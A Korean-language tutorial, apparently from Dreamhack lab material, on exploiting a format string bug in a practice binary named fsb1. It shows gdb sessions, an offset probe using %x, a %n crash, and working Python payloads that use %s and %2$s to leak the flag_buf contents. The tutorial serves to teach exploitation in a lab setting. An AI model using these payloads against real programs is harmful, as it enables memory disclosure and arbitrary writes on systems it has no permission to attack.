Format String Bug (FSB) :
    우선 포맷 스트링 버그가 존재하면 포맷 스트링이 참조하는 버퍼에 공격자의 값을 쓸 수 있는지, 
    그리고 입력한 데이터가 몇 번째 포맷 스트링에 참조되는지를 먼저 알아내야 합니다. 
    공격자가 변조 가능한 데이터가 포맷 스트링에 의해 참조된다면 임의 주소에 값을 쓰거나 읽는 것이 가능해집니다.

    fsb를 확인해보면 처음 입력 값 "AAAA"가 두 번째 포맷 스트링에 의해 참조되는 것을 확인할 수 있습니다.
    ex) fsb
        $ ./fsb1
        Input: AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x 
        AAAA9ca9008.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.a78252e.0
            
    해당 값은 printf가 호출될 때의 스택 포인터의 값을 확인하면 정확하게 알아낼 수 있습니다.

    만약 처음에 입력한 4 바이트의 값이 특정 메모리 주소라면, 해당 포인터를 참조하는 포맷 스트링을 사용했을 때 입력한 주소에 값을 쓰거나 읽을 수 있습니다.
   
    fsb_n을 보면 "AAAA%x.%n"을 입력했을 때 printf 함수가 실행되면서 프로그램이 비정상 종료한 것을 알 수 있습니다. 
    ex) fsb_n
        # gdb fsb1
        (gdb) set disassembly-flavor intel
        (gdb) r
        Starting program: ./fsb1 
        Input: AAAA%x.%n
        
        Program received signal SIGSEGV, Segmentation fault.
        0xf7e43369 in _IO_vfprintf_internal (s=0xffffafd4, format=<optimized out>, ap=0xffffd5b8 "%x.%n\n") at vfprintf.c:1631
        1631	vfprintf.c: No such file or directory.
        (gdb) x/i $eip
        => 0xf7e43369 <_IO_vfprintf_internal+8873>:	mov    DWORD PTR [eax],esi
        (gdb) i r $eax $esi
        eax            0x41414141	1094795585
        esi            0xc	12

    비정상 종료가 발생한 명령어와 레지스터를 gdb를 통해 확인해보면, 
    0x41414141이 "%n" 포맷 스트링을 통해 참조되어 값을 쓰다가 Segmentation fault가 발생되는 것을 알 수 있습니다.

    이해를 돕기 위해 요약한 명령어는 다음과 같습니다.
    ex)
        mov    DWORD PTR [0x41414141], 0xc

    만약 두 번째 값이 0x41414141이 아닌 메모리에 존재하는 주소라면 해당 영역에 값을 쓰거나 읽을 수 있습니다.

    "%n" 포맷 스트링을 이용하면 원하는 주소를 참조하여 값을 쓸 수 있다는 것을 알았습니다. 
    그러나 fsb1에서는 전역 변수 flag_buf에 저장된 내용을 읽어야 합니다.

    flag_buf의 주소는 심볼을 이용해 gdb에서 다음과 같이 알아낼 수 있습니다.
    ex)
        (gdb) info var flag_buf
        All variables matching regular expression "flag_buf":
        
        Non-debugging symbols:
        0x0804a080  flag_buf

    입력의 첫 4 바이트에 0x804a080 주소를 입력하여 두 번째 포맷 스트링을 참조할 때 해당 주소를 참조하도록 합니다.

    특정 문자열을 출력할 때는 "%s" 포맷 스트링을 사용하여 다음과 같이 지정된 주소의 문자열을 출력할 수 있습니다.
    ex)
        printf("%s", "HELLO WORLD")

    만약 "[flag_buf 주소].%x.%s"을 삽입한다면 "%s" 포맷 스트링을 처리할 때 printf("%s", 0x804a080)의 결과를 출력할 것입니다.

    fsb1_exploit을 확인해보면 성공적으로 "flag" 파일의 내용인 "DREAMHACK_FORMATSTRING" 문자열이 출력된 것을 확인할 수 있습니다.
    ex)
        (gdb) r <<< $(python -c 'print "\x80\xa0\x04\x08%x.%s"')
        Starting program: ./fsb1 <<< $(python -c 'print "\x80\xa0\x04\x08%x.%s"')
        Input: ?804b008.DREAMHACK_FORMATSTRING
    
    만약 사용자가 입력한 값이 두 번째가 아닌 천 번째, 만 번째 포맷 스트링에서 참조할 수 있다면
    해당 포인터를 참조하도록 많은 포맷 스트링을 입력해 접근해야 합니다.
    그러나 이를 쉽게 해결하는 방법 또한 존재합니다.

    fsb1_exploit2를 확인해보면 "[flag_buf 주소]%2$s"를 입력하였습니다.
    ex)
        (gdb) r <<< $(python -c 'print "\x80\xa0\x04\x08%2$s"')
        Starting program: /mnt/hgfs/ubuntu/dreamhack/fsb1 <<< $(python -c 'print "\x80\xa0\x04\x08%2$s"')
        Input: ?DREAMHACK_FORMATSTRING

    "%N$"는 N 번째 매개 변수를 특정 포맷 스트링으로 처리할 때 사용합니다.
    예제에서 다룬 "%2$s"는 두 번째 주소를 "s" 포맷 스트링을 통해 출력한다는 의미입니다.

    fsb_example.c는 "%N$"의 이해를 돕기 위한 간단한 예제입니다.
    ex) fsb_example.c
        #include <stdio.h>
        int main()
        {
            printf("%2$s", "HELLO", "WORLD");
        }

    실행 결과는 다음과 같습니다.
    ex)
        $ ./ex
        WORLD

    이처럼 "$"를 사용하면 원하는 번지의 주소를 쉽게 참조할 수 있기 때문에 유용하게 사용할 수 있습니다.

    






































